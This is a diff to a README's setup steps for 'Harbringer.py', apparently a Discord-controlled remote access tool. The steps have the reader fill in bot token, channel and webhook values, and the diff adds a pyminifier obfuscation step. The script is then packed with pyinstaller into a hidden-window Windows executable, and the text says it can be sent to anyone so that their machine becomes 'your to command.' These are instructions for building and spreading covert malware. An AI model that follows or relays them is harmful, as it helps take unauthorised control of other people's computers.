@@ -47,8 +47,9 @@ There are a few things you will need to set up to make this work:
 ## Preparation
 
 1. Now open up the Harbringer.py file, edit the following variables: `TOKEN = "<Add your bot token here>"`, `CHANNEL_ID = "<Add your channel ID here>"`, `webhook_url = "<Add your webhook here>"`; these should now have the correct values in the Harbringer.py file.
-2. Now open a powershell or cmd terminal where you have saved the Harbringer.py file and run this command: `pyinstaller Harbringer.py --onefile --noconsole` to create the executable file. This will be stored in a folder called "dist" that will be created when the command is run.
-3. You can send this executable file to anyone and when they run it on a windows machine, that machine will be your to command. 
+2. Now open up a powershell terminal or cmd terminal where the files are, and run the command: `pyminifier -o finished.py Harbringer.py` 
+3. Run this command now: `pyinstaller finished.py --onefile --noconsole` to create the executable file. This will be stored in a folder called "dist" that will be created when the command is run.
+4. You can send this executable file to anyone and when they run it on a windows machine, that machine will be your to command. 
 
 ## Extras: 
 
